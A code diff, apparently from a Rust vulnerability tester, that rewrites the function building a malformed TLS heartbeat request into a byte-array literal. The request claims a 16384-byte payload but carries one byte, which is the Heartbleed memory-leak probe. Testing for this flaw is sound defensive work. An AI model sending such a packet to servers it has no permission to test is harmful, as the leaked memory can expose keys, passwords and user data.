@@ -272,24 +272,18 @@ impl HeartbleedTester {
     ///
     /// If vulnerable, server will echo 16384 bytes from memory!
     fn build_malformed_heartbeat(&self) -> Vec<u8> {
-        let mut heartbeat = Vec::new();
-
-        // TLS Record Header
-        heartbeat.push(0x18); // Content Type: Heartbeat
-        heartbeat.push(0x03); // Version: TLS 1.2
-        heartbeat.push(0x03);
-        heartbeat.push(0x00);
-        heartbeat.push(0x13); // Length: 19 bytes (1 + 2 + 1 + 16)
-
-        // Heartbeat Message
-        heartbeat.push(0x01); // Type: Request
-
-        // Payload Length: MALFORMED - claim 16384 bytes!
-        heartbeat.push(0x40); // 0x4000 = 16384
-        heartbeat.push(0x00);
-
-        // Actual Payload: only 1 byte!
-        heartbeat.push(0x41); // 'A'
+        let mut heartbeat = vec![
+            // TLS Record Header
+            0x18, // Content Type: Heartbeat
+            0x03, // Version: TLS 1.2
+            0x03, 0x00, 0x13, // Length: 19 bytes (1 + 2 + 1 + 16)
+            // Heartbeat Message
+            0x01, // Type: Request
+            // Payload Length: MALFORMED - claim 16384 bytes!
+            0x40, // 0x4000 = 16384
+            0x00, // Actual Payload: only 1 byte!
+            0x41, // 'A'
+        ];
 
         // Padding: 16 bytes (required)
         heartbeat.extend_from_slice(&[0x00; 16]);
